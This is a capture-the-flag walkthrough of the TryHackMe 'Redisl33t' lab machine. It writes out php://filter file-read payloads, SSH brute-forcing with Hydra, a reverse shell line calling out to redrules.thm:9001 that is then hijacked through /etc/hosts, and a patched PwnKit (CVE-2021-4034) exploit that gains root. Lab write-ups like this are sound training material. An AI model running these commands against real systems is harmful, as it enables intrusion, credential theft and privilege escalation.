# Red

The match has started, and Red has taken the lead on you.
But you are Blue, and only you can take Red down.

However, Red has implemented some defense mechanisms that will make the battle a bit difficult:
1. Red has been known to kick adversaries out of the machine. Is there a way around it?
2. Red likes to change adversaries' passwords but tends to keep them relatively the same. 
3. Red likes to taunt adversaries in order to throw off their focus. Keep your mind sharp!

This is a unique battle, and if you feel up to the challenge. Then by all means go for it!

A classic battle for the ages.

Room: https://tryhackme.com/room/redisl33t

⚠️ STOP

Stuck and need a nudge in the right direction?

➡️ Try the hints page before reading the full solution: https://github.com/garthheff/CTF-Hints/blob/main/redisl33t.md

--------------

# TryHackMe Redisl33t Walkthrough

## Overview

This room started with a simple web service and SSH. The web application had a file read issue through the `page` parameter. That gave access to local files, including Blue’s history and reminder file. From there, we generated a password list, found Blue’s SSH password, hijacked Red’s recurring reverse shell by appending to `/etc/hosts`, and finally used a planted SUID `pkexec` binary with a modified PwnKit exploit to gain root.

## Enumeration

Initial Nmap scan showed only SSH and HTTP exposed.

```bash
sudo nmap -sV -sC -p- --min-rate 5000 -oN nmap-sv-all.txt TARGET_IP
```

Results:

```text
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu
80/tcp open  http    Apache httpd 2.4.41
```

The web page redirected to:

```text
/index.php?page=home.html
```

This looked like a possible local file read or include parameter.

## Directory Enumeration

Gobuster showed a standard Bootstrap template and a few HTML files.

```bash
gobuster dir -u http://TARGET_IP/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,html,bak,zip,old -o gobuster-root.txt
```

Interesting results:

```text
/index.php      redirects to /index.php?page=home.html
/home.html
/about.html
/contact.html
/signin.html
/signup.html
/readme.txt
/assets
```

The `readme.txt` confirmed the site was based on the Atlanta Bootstrap template.

## Reading PHP Source

The `page` parameter accepted stream wrappers, so we used `php://filter` to read the PHP source.

```bash
curl -s 'http://TARGET_IP/index.php?page=php://filter/convert.base64-encode/resource=index.php' | base64 -d
```

Source:

```php
<?php 

function sanitize_input($param) {
    $param1 = str_replace("../","",$param);
    $param2 = str_replace("./","",$param1);
    return $param2;
}

$page = $_GET['page'];
if (isset($page) && preg_match("/^[a-z]/", $page)) {
    $page = sanitize_input($page);
    readfile($page);
} else {
    header('Location: /index.php?page=home.html');
}

?>
```

The application used `readfile`, not `include`, so this was arbitrary file read rather than code execution.

The regex only required the value to start with a lowercase letter. Since `php://filter` starts with `p`, it bypassed the check.

## Reading Local Files

We read `/etc/passwd`:

```bash
curl -s 'http://TARGET_IP/index.php?page=php://filter/convert.base64-encode/resource=/etc/passwd' -o passwd.b64
base64 -d passwd.b64
```

Interesting users:

```text
blue:x:1000:1000:blue:/home/blue:/bin/bash
red:x:1001:1001::/home/red:/bin/bash
```

The hostname was also `red`.

```bash
curl -s 'http://TARGET_IP/index.php?page=php://filter/convert.base64-encode/resource=/etc/hostname' | base64 -d
```

Output:

```text
red
```

## Finding Blue’s Clue

We checked Blue’s files through the file read.

```bash
curl -s 'http://TARGET_IP/index.php?page=php://filter/convert.base64-encode/resource=/home/blue/.bash_history' | base64 -d
```

Blue’s history contained:

```text
echo "Red rules"
cd
hashcat --stdout .reminder -r /usr/share/hashcat/rules/best64.rule > passlist.txt
cat passlist.txt
rm passlist.txt
sudo apt-get remove hashcat -y
```

This told us to read Blue’s `.reminder` file and apply Hashcat’s `best64.rule`.

```bash
curl -s 'http://TARGET_IP/index.php?page=php://filter/convert.base64-encode/resource=/home/blue/.reminder' | base64 -d
```

Reminder value:

```text
sup3r_p@s$w0rd!
```

## Generating the Password List

The rule file was not at the default path on our AttackBox, so we located it.

```bash
find / -iname 'best64.rule' 2>/dev/null
```

Found:

```text
/usr/local/hashcat/rules/best64.rule
/usr/local/john/run/rules/best64.rule
```

We generated the candidate list:

```bash
echo 'sup3r_p@s$w0rd!' > reminder.txt
hashcat --stdout reminder.txt -r /usr/local/hashcat/rules/best64.rule > passlist.txt
```

Then used Hydra against SSH:

```bash
hydra -l blue -P passlist.txt ssh://TARGET_IP -V -I
```

Hydra found:

```text
blue : !dr0w$s@p_r3pus
```

## SSH as Blue

```bash
sshpass -p '!dr0w$s@p_r3pus' ssh -o StrictHostKeyChecking=accept-new blue@TARGET_IP
```

Once logged in, Red started sending taunting messages to Blue’s terminal. Some messages included Base64 strings pretending to be passwords.

Example:

```text
WW91IHJlYWxseSBzdWNrIGF0IHRoaXMgQmx1ZQ==
```

Decoded:

```bash
echo 'WW91IHJlYWxseSBzdWNrIGF0IHRoaXMgQmx1ZQ==' | base64 -d
```

Output:

```text
You really suck at this Blue
```

These were bait, not real passwords.

After failed sudo attempts, the shell was killed and Blue’s password changed. A generated password mutation worked afterwards:

```text
sup3r_p@s$w0rd!9
```

## Finding the Source of the Messages

Process enumeration showed Red-owned reverse shell commands repeatedly spawning.

```bash
ps auxww | grep -Ei 'wall|write|echo|blue|red|bash|python|perl|php|cron|sleep' | grep -v grep
```

Interesting processes:

```text
red bash -c nohup bash -i >& /dev/tcp/redrules.thm/9001 0>&1 &
red bash -c nohup bash -i >& /dev/tcp/redrules.thm/9001 0>&1 &
```

The PID changed each time, meaning killing one process was not enough. Something was repeatedly spawning reverse shells as `red`.

## Hijacking Red’s Callback

The reverse shell connected to:

```text
redrules.thm:9001
```

We checked `/etc/hosts`.

```bash
cat /etc/hosts
```

It contained:

```text
192.168.0.1 redrules.thm
```

The file looked writable:

```bash
ls -l /etc/hosts
```

Output:

```text
-rw-r--rw- 1 root adm ...
```

However editing failed. Checking file attributes showed why:

```bash
lsattr /etc/hosts
```

Output:

```text
-----a--------e----- /etc/hosts
```

The `a` attribute means append-only. We could not edit or remove existing lines, but we could append a new line.

We appended our AttackBox IP:

```bash
echo 'ATTACKBOX_IP redrules.thm' >> /etc/hosts
```

Then started a listener on the AttackBox:

```bash
nc -lvnp 9001
```

When Red’s reverse shell spawned again, it connected to us.

```text
Connection received on TARGET_IP
red@red:~$
```

We now had a shell as `red`.

## Stabilising Red’s Shell

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
```

## Privilege Escalation Enumeration

As `red`, we found a hidden `.git` directory in Red’s home.

```bash
cd /home/red/.git
ls -la
```

Output:

```text
-rwsr-xr-x 1 root root 31032 Aug 14 2022 pkexec
```

This was a planted SUID `pkexec` binary.

The normal system `pkexec` was not SUID:

```bash
ls -l /usr/bin/pkexec
```

Output:

```text
-rwxr-xr-x 1 root root 31032 May 26 2021 /usr/bin/pkexec
```

But the planted one was SUID root:

```bash
ls -l /home/red/.git/pkexec
```

Output:

```text
-rwsr-xr-x 1 root root 31032 Aug 14 2022 /home/red/.git/pkexec
```

It also reported a vulnerable Polkit version:

```bash
/home/red/.git/pkexec --version
```

Output:

```text
pkexec version 0.105
```

This pointed to PwnKit, CVE-2021-4034.

## PwnKit Issue

The PwnKit binary we already had downloaded was compiled to call:

```text
/usr/bin/pkexec
```

We confirmed this with `strings`:

```bash
strings ./PwnKit | grep -E 'pkexec|/usr/bin|GCONV|PATH'
```

Output included:

```text
/usr/bin/pkexec
pkexec
```

The problem was that `/usr/bin/pkexec` was not SUID, so the exploit failed silently.

The vulnerable binary was:

```text
/home/red/.git/pkexec
```

Some other approaches would be to modify the PwnKit source before compiling, for example changing the final call from `/usr/bin/pkexec` to `/home/red/.git/pkexec`, or using a version that calls `execvpe("pkexec", args, env)` and setting `PATH` so `/home/red/.git` is found first.

In our case, the compiled binary was already on the machine, so we patched the compiled exploit.

## Patching the Compiled PwnKit Binary

Because `/home/red/.git/pkexec` is longer than `/usr/bin/pkexec`, we could not safely replace the embedded string directly inside the binary.

Instead, we created a shorter symlink:

```bash
cd /tmp
ln -sf /home/red/.git/pkexec /tmp/pkexec
/tmp/pkexec --version
```

Output:

```text
pkexec version 0.105
```

Then we patched the compiled PwnKit binary, replacing:

```text
/usr/bin/pkexec
```

with:

```text
/tmp/pkexec
```

and padded the remaining bytes with null bytes.

```bash
python3 - <<'PY'
from pathlib import Path

p = Path("/tmp/PwnKit")
data = p.read_bytes()

old = b"/usr/bin/pkexec"
new = b"/tmp/pkexec"

if old not in data:
    print("old path not found")
else:
    data = data.replace(old, new + b"\x00" * (len(old) - len(new)))
    p.write_bytes(data)
    print("patched")
PY
```

Clean old exploit files and run it:

```bash
cd /tmp
rm -rf .pkexec GCONV_PATH pwnkit.so payload.so exploit.so
chmod +x PwnKit
./PwnKit
```

This dropped us into a root shell:

```text
root@red:/tmp#
```

## Root Flag

```bash
cd /root
ls
cat flag3
```

Flag:

```text
THM{Go0d_Gam3_Blu3_GG}
```

## Summary

The attack chain was:

```text
Nmap found SSH and HTTP
Web app used index.php?page=home.html
php://filter allowed source disclosure and arbitrary file read
/etc/passwd revealed users blue and red
Blue’s .bash_history revealed a Hashcat rule clue
Blue’s .reminder provided the base password
best64.rule generated Blue’s SSH password
SSH access as blue triggered Red’s taunting messages
Red was repeatedly spawning reverse shells to redrules.thm:9001
/etc/hosts was append-only but appendable
Appending our AttackBox IP for redrules.thm hijacked Red’s callback
Caught shell as red
Found SUID pkexec at /home/red/.git/pkexec
Patched compiled PwnKit to use a symlink to the planted pkexec
Gained root
```

## Notes on the PwnKit Method

The way we rooted the machine was slightly different from the cleaner source-code method.

A cleaner approach would be:

```text
Modify PwnKit source before compiling
Point it at /home/red/.git/pkexec
Compile
Run
```

Another possible approach, if the source uses:

```c
execvpe("pkexec", args, env);
```

would be:

```bash
export PATH=/home/red/.git:$PATH
./PwnKit
```

That should make the exploit resolve `pkexec` from `/home/red/.git` first.

However, in our run, the already compiled PwnKit binary still attempted to use `/usr/bin/pkexec`, which was not SUID. Since the file was already downloaded, we patched the compiled binary instead by replacing `/usr/bin/pkexec` with `/tmp/pkexec`, where `/tmp/pkexec` was a symlink to the planted SUID binary.

Both methods target the same weakness. The important part is making the exploit execute the vulnerable SUID binary at:

```text
/home/red/.git/pkexec
```

rather than the non-SUID system binary at:

```text
/usr/bin/pkexec
```

